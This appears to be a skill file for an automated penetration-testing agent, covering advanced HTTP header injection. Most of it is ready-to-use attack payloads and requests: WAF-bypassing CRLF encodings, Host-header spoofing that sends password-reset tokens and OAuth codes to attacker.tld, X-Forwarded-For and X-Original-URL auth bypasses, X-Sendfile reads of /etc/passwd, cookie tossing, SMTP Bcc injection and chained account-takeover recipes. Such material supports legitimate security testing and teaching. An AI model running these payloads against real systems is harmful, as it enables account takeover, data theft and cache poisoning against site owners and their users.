---
name: header-injection-advanced-deep
description: Advanced header-injection exploitation — CRLF payload taxonomy across encoding layers, cache-key reconnaissance methodology, X-Forwarded-* precedence testing with worked proxy-chain recipes, Host-header exploitation deep catalog, Set-Cookie manipulation and cookie tossing, internal-redirect and handler-confusion deep catalog, X-HTTP-Method-Override primitives, HTTP/2 pseudo-header edges, and composite chaining into open-redirect, cache-poisoning-to-XSS, SSRF, and request-smuggling.
sibling: header_injection
load_when: scan_mode == "deep"
---

# HTTP Header Injection — Advanced + Expert Depth

This is the advanced+expert deep sibling to `header_injection.md`. The base owns class framing, the measured framework-host-trust table, CR/LF encoding variants, parser fingerprinting, key vulnerabilities (CRLF response splitting, cache poisoning, Host confusion, cookie manipulation, forwarding-header spoofing, content-type confusion, internal-redirect handler-confusion, XSS-via-headers, open-redirect-via-headers, HTTP/2 pseudo-header confusion), and the 2024-2026 CVE routing map.

The novel+frontier sibling `header_injection_novel_deep.md` owns the 2024-2026 CVE instances (Next.js cache poisoning, the Pimcore/ArrowCMS/scheduleR/Coolify/Kanboard/sharewarez Host-header password-reset lineage) with canonical version/GHSA tables and the current research frontier.

This file owns the expert-tier exploitation mechanics: CRLF payload taxonomy per encoding layer, cache-key reconnaissance methodology, X-Forwarded-* precedence testing with worked proxy-chain recipes, Host-header exploitation deep catalog, Set-Cookie manipulation depth with cookie-tossing, internal-redirect / handler-confusion deep catalog, HTTP/2 pseudo-header edges, and composite-chain construction routed to sibling skills.

Load this file when the goal is to construct a reliable header-injection exploit against a hardened target — simple CRLF probes have failed, there is at least one layer of defence (WAF, proxy normalization, framework CRLF stripping) to be worked around, and the question is which encoding layer or parser disagreement opens the window.

## CRLF Payload Taxonomy

### Primitive: Base-Encoding CRLF

Primitive: user input echoed into a header value; CRLF untrimmed; the second line is a new header.

**Preconditions:**

1. User input reaches a header value via framework code that does not strip `\r`/`\n`.
2. The HTTP response serializer accepts the embedded bytes as part of the header value.
3. The downstream consumer (browser, cache, proxy) parses the resulting response as two headers.

**Attack recipe:**

```
GET /redirect?to=foo%0d%0aSet-Cookie:%20admin=1%0d%0a%0d%0a<html>poisoned</html> HTTP/1.1
```

The server echoes `foo\r\nSet-Cookie: admin=1\r\n\r\n<html>poisoned</html>` into the `Location:` header value; the response contains the injected `Set-Cookie` as a separate header and a response-body prefix.

**Confirmation signal:** second response from the cache (keyed on the original URL) contains the injected `Set-Cookie`; the client receives both the redirect and the attacker-chosen cookie.

**Impact:** Session fixation, cookie poisoning, response body hijack.

### Primitive: Double-Encoded CRLF

Primitive: WAF decodes once (`%250d%250a` → `%0d%0a`), server decodes once more (`%0d%0a` → `\r\n`); the WAF sees literal `%0d%0a` and allows it.

**Preconditions:**

1. WAF or sanitizer that URL-decodes once before applying CRLF checks.
2. Application framework that URL-decodes once more (common when the WAF decodes once and passes the single-encoded value to the app).

**Attack recipe:** `?to=foo%250d%250aSet-Cookie:%2520admin=1`.

**Confirmation signal:** CRLF appears in the response headers; the WAF's log shows no CRLF-match.

**Impact:** WAF bypass; the response-splitting primitive succeeds.

### Primitive: Unicode Line Separator

Primitive: `U+2028` (line separator) and `U+2029` (paragraph separator) are LF-equivalent in some JavaScript engines and some HTTP parsers; folded to LF before the framework's CRLF-strip runs.

**Preconditions:** Parser that treats these codepoints as LF-equivalent during input normalization.

**Attack recipe:** `?to=foo%E2%80%A8Set-Cookie:...`.

**Confirmation signal:** response contains the injected header on a parser known to fold U+2028.

**Impact:** CRLF-strip bypass on JS-processed input paths.

### Primitive: Overlong UTF-8 CR/LF

Primitive: `%C0%8D` and `%C0%8A` encode CR and LF in overlong (two-byte) UTF-8, which is invalid per RFC 3629 but accepted by some parsers.

**Preconditions:** Parser that accepts overlong UTF-8 (older Apache mod_proxy, some application-level parsers, legacy encoders).

**Attack recipe:** `?to=foo%C0%8DSet-Cookie...`.

**Confirmation signal:** CRLF injected despite CRLF-stripping on canonical `%0d%0a`.

**Impact:** CRLF-strip bypass on overlong-tolerant parsers.

### Primitive: Tab Instead of Space

Primitive: `%09` (tab) between header name and value is accepted by RFC 7230 field values; a simple `\s+` or " "-based filter may miss it.

**Preconditions:** Filter that matches space but not tab for CRLF-boundary detection.

**Attack recipe:** `?to=foo%0d%0aSet-Cookie:%09admin=1`.

**Confirmation signal:** `Set-Cookie:\tadmin=1` lands as a valid header.

**Impact:** Header-value-shape bypass.

### Primitive: Null-Byte Truncation

Primitive: Some parsers truncate at `\x00`; the attacker-value is truncated so a filter sees a benign prefix.

**Preconditions:** C-style string handling in the response-serialization path.

**Attack recipe:** `?to=foo%00<CRLF-payload-here>` — on a null-truncating parser, the filter sees `foo` and allows it; the full byte sequence reaches the response serializer.

**Confirmation signal:** CRLF succeeds past a filter that would have blocked it.

**Impact:** Parser-truncation bypass.

## Cache-Key Reconnaissance (Pointer + Header-Injection-Side Residual)

**Canonical owner for cache-poisoning mechanism**: `web_cache_poisoning` + `web_cache_poisoning_advanced_deep` own the unkeyed-input mechanism, the three-step confirmation protocol (poison + clean + observe), per-CDN behavioral depth (Cloudflare, Fastly, Akamai, CloudFront, Varnish), and the chained exploitation with cache-poisoned XSS. `web_cache_poisoning_novel_deep.md` owns the CVE catalog (Next.js ISR CVE-2024-46982, ATS fragment-unkeying CVE-2021-27577 as canonical mechanism exemplar) with version metadata single-owned there.

**Header-injection-side residual** (specifically where header-injection primitives interact with the cache):

- **CRLF-injected Vary manipulation**: CRLF injection reaches the response's `Vary` header. `?crlf=%0d%0aVary:%20User-Agent` over-fragments the cache (DoS-flavored); `?crlf=%0d%0aVary:` (empty) under-fragments. The injection is header-injection class; the cache DoS consequence is cache-poisoning class.
- **CRLF-injected Cache-Control flip**: CRLF injection reaches the response's `Cache-Control` header. `?crlf=%0d%0aCache-Control:%20public,%20max-age=999999` forces caching of a response that should not have been cached. Injection class is header-injection; the private-response-leakage consequence is cache-poisoning.
- **Web Cache Deception**: appending a cacheable extension (`.css`, `.js`) to an authenticated URL (`/account/profile.css`) tricks the cache into storing authenticated content at a public-looking URL. The primitive is route-matching behavior (framework ignores extensions); the cache stores regardless of auth. **Attack recipe**: victim visits `/account/profile.css` while cookied; cache stores; attacker fetches same URL from clean session; cache hit returns victim's data. The header-injection-side framing is minimal (the Content-Type / routing header may contribute); the cache-poisoning-side framing (owner) is the stored unkeyed-input primitive.

For the full unkeyed-header discovery methodology, candidate-header list, and three-step confirmation protocol, load `web_cache_poisoning_advanced_deep.md § Cache-Key Composition Reconnaissance` and `§ Unkeyed-Input Discovery`. Verify the deployed cache layer against the per-CDN behavioral matrix at `web_cache_poisoning_novel_deep.md § Per-CDN × Per-Header Matrix (Baseline + Unverified-Current)`.

## X-Forwarded-* Precedence Testing

### Primitive: Dual-Header Precedence

Primitive: send both `Host` and `X-Forwarded-Host` with different values; observe which the application trusts.

**Preconditions:** Application reads one of these for URL construction.

**Attack recipe:**

```http
POST /password-reset HTTP/1.1
Host: canonical.target.tld
X-Forwarded-Host: attacker.tld
```

Observe:

- Reset link in the email: which host?
- Response `Location` on a redirect: which host?
- Log entries: which host?

**Confirmation signal:** attacker-controlled host appears in the user-facing output.

**Impact:** The application's trust model treats `X-Forwarded-Host` as authoritative; the attacker can spoof it from the public internet unless the proxy strips it.

### Primitive: IP-Allowlist Bypass

Primitive: `X-Forwarded-For: 127.0.0.1, 10.0.0.5` to bypass an IP allowlist that reads the first (or last) IP from the chain.

**Preconditions:** Application reads `X-Forwarded-For` and the proxy does not sanitize it (does not strip or does not override).

**Attack recipe:**

- First-IP trust: `X-Forwarded-For: 127.0.0.1`.
- Last-IP trust: `X-Forwarded-For: 1.1.1.1, 127.0.0.1`.
- Mixed trust: send multiple values and observe which the allowlist matches.

**Confirmation signal:** admin endpoint reachable from the public internet with the spoofed header.

**Impact:** IP-based auth bypass; admin / internal / debug endpoint exposure.

### Primitive: X-Original-URL / X-Rewrite-URL on IIS

Primitive: IIS and ASP.NET framework treat `X-Original-URL` and `X-Rewrite-URL` as the "real" URL for routing after the auth check runs; a URL rewrite happens after auth, so the attacker's rewritten URL reaches an admin handler that would have been auth-protected if the normal URL had been used.

**Preconditions:** Target is IIS/ASP.NET; URL-rewriting module enabled.

**Attack recipe:**

```http
GET /public-page HTTP/1.1
Host: target.tld
X-Original-URL: /admin/users
```

The outer `/public-page` passes auth (it's public); the rewrite swaps to `/admin/users`; the admin handler runs with the authenticated context (or no context, which the admin handler may permit by trust-of-rewrite).

**Confirmation signal:** admin page returned despite the outer URL being public.

**Impact:** Admin-panel auth bypass; classic high-impact finding on IIS deployments.

## Host-Header Exploitation Deep Catalog

### Primitive: Password-Reset Host Injection

Primitive: application constructs the reset URL from `Host`; attacker spoofs; reset email delivers to the attacker's domain.

**Preconditions:** Reset-URL constructor reads `request.host`/`Host` directly; no canonical-host configuration (`SERVER_NAME` in Flask, `canonical_url` in Django, `application_url` in Kanboard).

**Attack recipe:**

```http
POST /password-reset HTTP/1.1
Host: attacker.tld

email=victim@target.tld
```

The server generates `https://attacker.tld/reset?token=<token>`; sends it to victim's `victim@target.tld`; the victim clicks; the reset token delivers to the attacker's server (if the attacker hosts a listener at `attacker.tld`).

**Confirmation signal:** attacker's web server receives a request with the reset token in the URL; attacker uses the token at the real `target.tld/reset` to set a new password.

**Impact:** Account takeover; the dominant class in 2024-2026 CVE Host-header injection (see novel sibling for 7 CVEs).

### Primitive: OAuth redirect_uri Host Confusion

Primitive: OAuth authorization endpoint constructs the `redirect_uri` from `Host`; attacker spoofs; code delivers to attacker.

**Preconditions:** OAuth provider derives `redirect_uri` from the client's `Host` header rather than a per-client allowlist.

**Attack recipe:** `GET /oauth/authorize?...` with `Host: attacker.tld`; the server redirects to `attacker.tld/callback?code=<code>`.

**Confirmation signal:** attacker's server receives the OAuth code; attacker exchanges for an access token.

**Impact:** OAuth token theft; see `open_redirect.md § OAuth redirect_uri` for the open-redirect framing.

### Primitive: Canonical-URL Injection in SEO Tags

Primitive: `<link rel="canonical" href="https://{Host}/current-url">` or Open Graph tags constructed from Host; attacker spoofs; search-engine indexing points to the attacker's domain.

**Preconditions:** Server-rendered page interpolates `request.host` into canonical/OG tags.

**Attack recipe:** attacker hosts a search-engine-crawlable page under their domain that triggers the vulnerable application with `Host: attacker.tld`; search engines index the response and discover the attacker's canonical.

**Confirmation signal:** search-engine results list `attacker.tld` as the canonical for the application's content.

**Impact:** SEO poisoning; brand damage; phishing-landing-page preparation.

### Primitive: Host Header + Cache Combination

Primitive: Host-poisoned response is cached; subsequent visitors see the attacker's canonical.

**Preconditions:** Host is unkeyed in the CDN cache (common on misconfigured CDNs); the application generates Host-dependent content.

**Attack recipe:** poison once with `Host: attacker.tld`; subsequent legitimate visitors hit the cached response with attacker's canonical links.

**Confirmation signal:** multiple users receive the attacker-canonical response.

**Impact:** Cache-amplified Host injection; one-shot attack affects many users.

## Set-Cookie Manipulation Deep

### Primitive: Cookie Tossing — Same-Name Shadow

Primitive: An attacker on a related subdomain sets a cookie with the same name as the target's session cookie but with a Domain attribute that overlaps; browser cookie precedence rules make the attacker's cookie win on some paths.

**Preconditions:**

1. Target's session cookie is set on `app.target.tld`.
2. Attacker controls `attacker.target.tld` or `sub.app.target.tld` (XSS, subdomain takeover, dev-infrastructure access).
3. Attacker sets `Set-Cookie: session=attacker-session; Domain=.target.tld; Path=/`.

**Attack recipe:**

```http
HTTP/1.1 200 OK
Set-Cookie: session=attacker-chosen-value; Domain=.target.tld; Path=/; Secure; HttpOnly
```

Browser cookie-jar rule: when two cookies with the same name differ by Path or Domain, both are sent; the one with the longer Path wins by RFC 6265 §5.4.

**Confirmation signal:** victim's requests to `app.target.tld` carry both cookies; the server picks one (first or last depending on implementation).

**Impact:** Session fixation; the attacker chose the session ID, so attacker is logged in as the victim on first visit.

### Primitive: Max-Age Deletion

Primitive: `Set-Cookie: session=; Max-Age=-1` evicts the victim's existing session cookie.

**Preconditions:** Attacker-side primitive (XSS on a related subdomain, header injection on the main domain) that can set cookies in the victim's browser.

**Attack recipe:** attacker-controlled page sets `session=; Max-Age=-1`; victim's session cookie is deleted.

**Confirmation signal:** victim is logged out.

**Impact:** DoS of the victim's session; also useful as a precondition to force the victim to re-authenticate (phishing primitive).

### Primitive: SameSite=None Downgrade

Primitive: attacker-controlled subdomain sets a cookie with `SameSite=None; Secure`; the cookie is now sent on cross-site requests.

**Preconditions:** Attacker controls a subdomain; CSRF defence relies on `SameSite=Lax/Strict`.

**Attack recipe:**

```http
Set-Cookie: csrf_token=attacker-chosen; Domain=.target.tld; SameSite=None; Secure
```

Browser now sends the attacker's `csrf_token` on cross-site POSTs; attacker's cross-site CSRF attack passes the token check.

**Confirmation signal:** CSRF endpoint accepts attacker-chosen token.

**Impact:** SameSite-based CSRF defence defeated.

## Internal-Redirect and Handler Confusion

### Primitive: CGI/FastCGI Response-Header Internal Dispatch

Primitive: CGI protocol allows the application to emit `Status:`, `Location:`, and `Content-Type:` headers; some servers interpret these as internal-redirect directives rather than external responses.

**Preconditions:** FastCGI/CGI deployment where the server respects internal-redirect headers.

**Attack recipe:**

- CRLF injection in a user-controlled application output reaches the CGI header set.
- Inject `Status: 200` + `X-Accel-Redirect: /internal-only/debug` → the server internally dispatches to the privileged handler.

**Confirmation signal:** response body is the internal handler's output; the server never contacted an external resource.

**Impact:** Reach a handler the external route would have blocked.

### Primitive: X-Accel-Redirect to Protected File

Primitive: Nginx `X-Accel-Redirect: /protected/file.pdf` sends the file; if user-input reaches this header, internal files become fetchable.

**Preconditions:** Nginx `internal` directive on protected paths; application uses `X-Accel-Redirect` for authorized downloads; CRLF reaches the header.

**Attack recipe:** CRLF-inject `X-Accel-Redirect: /etc/passwd` (if Nginx has routing to `/etc/passwd` via an alias misconfiguration) or `/private/user-X-document.pdf`.

**Confirmation signal:** response body is the protected file.

**Impact:** Local file read via Nginx subrequest.

### Primitive: X-Sendfile Equivalent in Apache / Lighttpd

Primitive: `X-Sendfile: /path/to/file` directive in Apache's `mod_xsendfile` or Lighttpd's `X-Sendfile`.

**Preconditions:** `mod_xsendfile` enabled; path validation absent or weak.

**Attack recipe:** CRLF-inject `X-Sendfile: /etc/passwd`.

**Confirmation signal:** response body is the file.

**Impact:** Local file read.

## X-HTTP-Method-Override Primitives

### Primitive: Reach State-Changing Handlers via GET

Primitive: application framework consults `X-HTTP-Method-Override` to determine the effective method, before method-based authorization runs.

**Preconditions:**

1. Framework reads `X-HTTP-Method-Override` and uses it for routing.
2. Authorization is method-based (e.g., `@PreAuthorize("@permissionEvaluator.canWrite()")` on PUT/DELETE handlers).

**Attack recipe:**

```http
GET /api/users/42 HTTP/1.1
X-HTTP-Method-Override: DELETE
```

Framework treats as DELETE; handler fires; auth check (if it ran after the override) accepts a DELETE from the GET-privileged caller.

**Confirmation signal:** resource deleted via GET.

**Impact:** Method-based auth bypass.

**Note:** From a browser, `X-HTTP-Method-Override` is non-safelisted; it triggers a CORS preflight. So this is primarily a server-to-server / internal-tooling / curl-shaped primitive, not a direct CSRF primitive. For CSRF scenarios, see `csrf.md § Method-Override`.

### Primitive: `_method` Form Field (Rails pattern)

Primitive: Rails and some other frameworks support `_method=PUT` form field to tunnel non-POST methods through POST; this is browser-friendly (not preflight-triggering).

**Preconditions:** Framework supports `_method` form parameter.

**Attack recipe:** `POST /api/users/42` with form body `_method=DELETE&...`.

**Confirmation signal:** DELETE fires.

**Impact:** CSRF-usable method override; routes through `csrf.md`.

## HTTP/2 Pseudo-Header Edges

### Primitive: `:authority` vs `Host` Disagreement

Primitive: HTTP/2 uses `:authority` pseudo-header; HTTP/1.1 uses `Host`. When H2 is downgraded to H1 at a proxy, the proxy may use `:authority` to construct the H1 `Host:` header. If the H2 client sends `:authority: a.tld` and also a plaintext `Host: b.tld` (which is allowed in some H2 implementations), the downstream H1 server may see different values.

**Preconditions:** H2-to-H1 proxy; H2 client can send both `:authority` and `Host`.

**Attack recipe:** H2 request with `:authority: canonical.tld` and `Host: internal.tld`; the proxy forwards `Host: internal.tld` to the backend.

**Confirmation signal:** backend logs show `Host: internal.tld`; application behaves as if the request was for the internal host.

**Impact:** Host-based routing bypass; reach internal virtual hosts not exposed externally.

### Primitive: Lowercased Header Name Bypass

Primitive: HTTP/2 lowercases all header names; a case-sensitive filter at the H2 layer misses `transfer-encoding` where it would have matched `Transfer-Encoding`.

**Preconditions:** H2 layer with case-sensitive filter; backend parses case-insensitively.

**Attack recipe:** H2 request with `transfer-encoding: chunked`; H2 filter does not match, backend processes.

**Confirmation signal:** Transfer-Encoding behavior despite the filter.

**Impact:** Smuggling precondition; see `http_request_smuggling.md`.

### Primitive: CONTINUATION Frame Splitting

Primitive: HTTP/2 HEADERS + CONTINUATION frames carry one logical header block; some intermediaries apply filters to each frame independently.

**Preconditions:** Filter that inspects HEADERS but not CONTINUATION.

**Attack recipe:** split the header set across HEADERS and CONTINUATION; the suspicious header is in CONTINUATION.

**Confirmation signal:** header passes through the filter.

**Impact:** Filter bypass.

## XSS via Response Headers — Deep

### Primitive: Reflected Referer Header

Primitive: application echoes `Referer` into a custom error page; `Referer` is attacker-controllable from an attacker-crafted link.

**Preconditions:** Custom error page interpolates `Referer`; no escaping.

**Attack recipe:** attacker posts a link to a page that errors; the error page reflects `Referer` from the attacker's hosting page; attacker's `Referer` is `https://attacker.tld/?a=<script>...</script>`; XSS fires.

**Confirmation signal:** script executes.

**Impact:** Reflected XSS via header; routes through `xss.md`.

### Primitive: Legacy Refresh Header

Primitive: `Refresh: 0; url=javascript:alert(1)` triggers meta-refresh-equivalent navigation to JavaScript URI.

**Preconditions:** Browser respects `Refresh` header (most still do, with some JavaScript-URL restrictions).

**Attack recipe:** CRLF-inject `Refresh: 0; url=javascript:alert(1)`.

**Confirmation signal:** script executes on page load.

**Impact:** Legacy-header XSS; works on older browsers / embedded webviews.

## Open-Redirect via Headers — Deep

### Primitive: Link Rel=Canonical Open Redirect

Primitive: `Link: <https://attacker.tld>; rel="canonical"` is consumed by SEO tooling and some clients that honor the link.

**Preconditions:** Downstream consumer honors `Link` header's canonical rel.

**Attack recipe:** CRLF-inject the Link header.

**Confirmation signal:** downstream treats the attacker's URL as canonical.

**Impact:** Soft open-redirect; SEO poisoning / crawler redirection.

### Primitive: Nginx X-Accel-Redirect to External URL

Primitive: Some Nginx configurations proxy `X-Accel-Redirect` targets to external URLs rather than internal paths.

**Preconditions:** Nginx with `internal` directive and `proxy_pass` on the redirect target.

**Attack recipe:** CRLF-inject `X-Accel-Redirect: https://attacker.tld/`.

**Confirmation signal:** Nginx proxies to the attacker's URL and returns its response.

**Impact:** SSRF-adjacent open-redirect; see `ssrf.md`.

## CDN-Specific Cache Behaviours (Pointer + Header-Injection-Side CRLF Residual)

**Canonical owner for per-CDN cache behavior**: `web_cache_poisoning_advanced_deep.md § Per-CDN Behavioral Depth` + `§ CDN Behavioral Matrix — Per-Header Status` own the per-CDN cache-key composition, documented unkeyed behaviors, and the Jan-2020 CERT/CC VU#335217 + youst.in (2022–2023) baseline matrix framed as unverified-current. `web_cache_poisoning_novel_deep.md § Per-CDN × Per-Header Matrix` owns the version-metadata-anchored instances.

**Header-injection-side CRLF-cache residual** (where header-injection primitives interact with CDN cache behavior):

- **Cloudflare default cache key**: `(host, URL path, query string)` — not headers. A header-reflected response cached under the URL-only key becomes cross-user. Header-injection primitive: `X-Forwarded-Host: attacker.tld`; origin reflects in HTML; Cloudflare caches regardless of header. Load `web_cache_poisoning_advanced_deep.md § Cloudflare` for the current primary-source behavior.

- **Fastly VCL mistake**: custom VCL that adds some headers to `req.hash` but not others produces unkeyed-but-reflected primitives. The VCL-config-side framing is Fastly-specific; load `web_cache_poisoning_advanced_deep.md § Fastly`.

- **Akamai Pragma debug + CRLF-injected Cache-Control**: Akamai honors `Pragma: akamai-x-cache-on` / `Pragma: akamai-x-get-cache-key` as debug headers. A CRLF-injected `Cache-Control` reaching the response makes the cache's TTL attacker-controlled. The injection class is header-injection; the long-TTL consequence is cache-poisoning. Load `web_cache_poisoning_advanced_deep.md § Akamai`.

- **Varnish fetch-TTL override via CRLF-injected Cache-Control**: Varnish's `beresp.ttl` reads from backend-emitted `Cache-Control`; a CRLF-injected `Cache-Control: max-age=99999999` forces long caching. The CRLF-injection primitive is header-injection class; the persistent cache-poisoning consequence routes to `web_cache_poisoning_advanced_deep.md § Varnish`.

Attack recipes for each CDN at depth are in the cache-poisoning advanced sibling; the header-injection framing above is the primitive-side primer for the CRLF-based cache-TTL manipulation surface specifically.

## SMTP Header Injection

### Primitive: User Input → SMTP Headers

Primitive: Application constructs an outbound email with user input in `To`, `From`, `Cc`, `Bcc`, or `Subject` headers. CRLF in the input injects extra headers or terminates the header block to inject into the body.

**Preconditions:** Application interpolates user input into mail headers without CRLF stripping.

**Attack recipe:**

```http
POST /contact HTTP/1.1

name=attacker&email=a@x%0d%0aBcc:%20victim@target.tld&subject=hello
```

The email handler constructs `From: a@x\r\nBcc: victim@target.tld` — the attacker added a Bcc header.

**Confirmation signal:** victim receives a Bcc of the outbound message.

**Impact:** Spam, phishing-redirection, mass-mail injection. SMTP header injection is a distinct class with the same root cause as HTTP header injection.

### Primitive: Mail-Body Injection via Header Terminator

Primitive: Injecting `\r\n\r\n` into a header value terminates the mail header block and begins the body; subsequent attacker input becomes mail body.

**Preconditions:** Same as above; mail library serializes raw-string headers.

**Attack recipe:** `email=a@x%0d%0a%0d%0a<html>phishing</html>`.

**Confirmation signal:** email body contains attacker's HTML.

**Impact:** Mail-content hijack; phishing delivery via trusted sender domain.

**Route to `information_disclosure.md § Email-Based Exfiltration`** when the email flow is used for exfiltration.

## WebSocket Upgrade Header Manipulation

### Primitive: Sec-WebSocket-Protocol Reflection

Primitive: Servers echo the client's `Sec-WebSocket-Protocol` in the handshake response. If the server doesn't validate the protocol against an allowlist, an attacker can inject arbitrary characters into the response header.

**Preconditions:** WebSocket server reflects `Sec-WebSocket-Protocol` without normalization.

**Attack recipe:** CRLF in the protocol field; the handshake response includes the injected header.

**Confirmation signal:** response contains the injected header.

**Impact:** CRLF via WebSocket handshake; chains to cache poisoning if the handshake response is cached.

### Primitive: Origin Reflection in CORS-Shaped WebSocket

Primitive: WebSocket servers may reflect `Origin` into `Access-Control-Allow-Origin` on the HTTP upgrade; attacker-chosen origin gets a credentialed-allowed response.

**Preconditions:** WebSocket server returns ACAO reflecting Origin on upgrade.

**Attack recipe:** attacker's Origin reflected; subsequent cross-origin WebSocket from attacker page succeeds with credentials.

**Confirmation signal:** cross-origin WebSocket opens; credentials attached.

**Impact:** CSWSH-adjacent; see `csrf.md § CSWSH`.

## Transfer-Encoding + Content-Length Collision

### Primitive: TE/CL Preference Disagreement

Primitive: HTTP/1.1 request with both `Transfer-Encoding: chunked` and `Content-Length` headers; different parsers prefer different headers. The disagreement at the proxy ↔ backend boundary is a smuggling precondition.

**Preconditions:** Front proxy and backend disagree on TE/CL precedence (RFC 7230 says TE wins, but implementations differ).

**Attack recipe:** send a request with both headers; the proxy uses one, the backend uses the other; the second half of the request's byte stream becomes the "next" request to the backend.

**Confirmation signal:** header-injection probes expose boundary disagreement; route to `http_request_smuggling.md`.

**Impact:** Request smuggling precondition. This belongs in the smuggling skill for full depth; the header-injection layer is the TE/CL header's role as a smuggling input. See `http_request_smuggling.md § TE.CL`.

### Primitive: Obfuscated TE Variants

Primitive: `Transfer-Encoding: chunked` is case-insensitive and whitespace-tolerant; obfuscated variants (`Transfer-encoding: Chunked`, `TRANSFER-ENCODING:\tchunked`, `Transfer-Encoding : chunked`) are often accepted by one side of a proxy pair but not the other.

**Preconditions:** Proxy and backend disagree on TE normalization.

**Attack recipe:** send a request with obfuscated TE; one side processes it, the other ignores.

**Confirmation signal:** request-boundary disagreement; route to smuggling.

**Impact:** Smuggling precondition.

## Compression-Ratio Side Channels

### Primitive: Deflate/Gzip Dictionary Oracle (BREACH-shape)

Primitive: Compressed responses leak secret-length via compression ratio when attacker-chosen plaintext is adjacent to the secret in the response. The attacker varies the chosen plaintext and observes the Content-Length of the compressed response; the ratio reveals which chars match the secret.

**Preconditions:** Response compression (gzip, deflate, br) with secret and attacker-input in the same compressed region.

**Attack recipe:** classic BREACH / CRIME shape; attacker's choice of input varies the compression ratio.

**Confirmation signal:** Content-Length variance correlates with attacker-chosen prefix.

**Impact:** Secret extraction via side channel. The header layer is the Content-Length that reveals the ratio.

**Route to `information_disclosure.md § BREACH-Shape Compression Side Channel`**.

## Composite Chain Construction

### Chain 1: Host-Header → Password-Reset → Account Takeover

- Host-injection: attacker-controlled Host in password-reset request.
- Reset-link delivery: email delivers link under attacker's host.
- Victim click: token leaks to attacker's server.
- Password change: attacker completes reset, sets own password.

Route: `authentication_jwt.md § Password-Reset Token Flows` for the token layer.

### Chain 2: Unkeyed Header → Cache Poisoning → Cross-User XSS

- Unkeyed-header discovery: find a header reflected in body but not cache key.
- CRLF inject into the response: content-type → text/html + body → `<script>...</script>`.
- Cache stores: every subsequent user receives the XSS payload.

Route: `xss.md` for the XSS layer; `header_injection_novel_deep.md § Next.js Cache Poisoning` for the CVE-2024-46982 instance.

### Chain 3: X-Forwarded-For → IP Allowlist Bypass → Admin Panel

- Spoof `X-Forwarded-For: 127.0.0.1`.
- IP allowlist on `/admin` matches 127.0.0.1 as "localhost — trusted".
- Admin panel reachable without auth.

Route: `broken_function_level_authorization.md § IP-Based Trust Bypass`.

### Chain 4: Method-Override → State-Change via GET → CSRF Amplification

- `X-HTTP-Method-Override: DELETE` on a GET request.
- Handler fires DELETE; auth check (if method-shaped) accepts GET-level privilege.
- Victim-browser-delivery: via `_method=DELETE` form (browser-safe).

Route: `csrf.md § Method-Override Primitives`.

### Chain 5: X-Original-URL → IIS URL-Rewrite → Admin Bypass

- `X-Original-URL: /admin/users` on a request to `/public`.
- IIS rewrites after auth; admin handler fires with public-URL's auth context.
- Admin operation succeeds.

Route: `broken_function_level_authorization.md § URL-Rewrite Trust Bypass`.

### Chain 6: CRLF → Response Splitting → Request Smuggling Precondition

- CRLF in response header → split response.
- Downstream cache stores the second half of the split.
- Second request from a different session: cache returns the attacker's second response.
- If the second response misaligns the connection, subsequent requests on the keep-alive are affected.

Route: `http_request_smuggling.md` for the smuggling-layer depth.

### Chain 7: Host-Header → OAuth redirect_uri → OAuth Code Theft

- `Host: attacker.tld` on OAuth authorize request.
- Server derives `redirect_uri` from Host; redirects to attacker.
- OAuth code delivered to attacker.
- Attacker exchanges for access token.

Route: `authentication_jwt.md § OAuth Flows` and `open_redirect.md § OAuth redirect_uri`.

## Verification Discipline

Every header-injection claim must survive:

1. **Durable artifact confirmation**: cache poisoning requires showing a second user receives the poisoned response; Host-header injection requires the email arriving at the attacker's domain. HTTP response status alone is not confirmation.
2. **Downstream parser agreement**: the CRLF must land as a real header in the cache/proxy/browser, not just appear in the attacker's own request echo.
3. **Encoding variance**: test base, double-encoded, and Unicode variants; the finding is scoped to the encoding(s) that work.
4. **Isolation of cause**: pair the exploit with a control (same request without CRLF) that shows the benign behaviour.
5. **Minimal reproducibility**: a single-request PoC that demonstrates the primitive without needing timing or race alignment.

## Summary

Advanced header-injection exploitation requires understanding every encoding layer in the request-to-response path, every parser's quirks around CR/LF and Unicode line separators, every cache's key composition, and every trust boundary at `X-Forwarded-*` / Host / method-override. The payoff is a wide range of chaining — Host → password-reset → account takeover, unkeyed-header → cache poisoning → cross-user XSS, X-Forwarded-For → IP allowlist bypass → admin, CRLF → response-splitting → smuggling precondition, X-Original-URL → URL-rewrite → admin bypass — each routed to the owner skill for the next layer's depth.
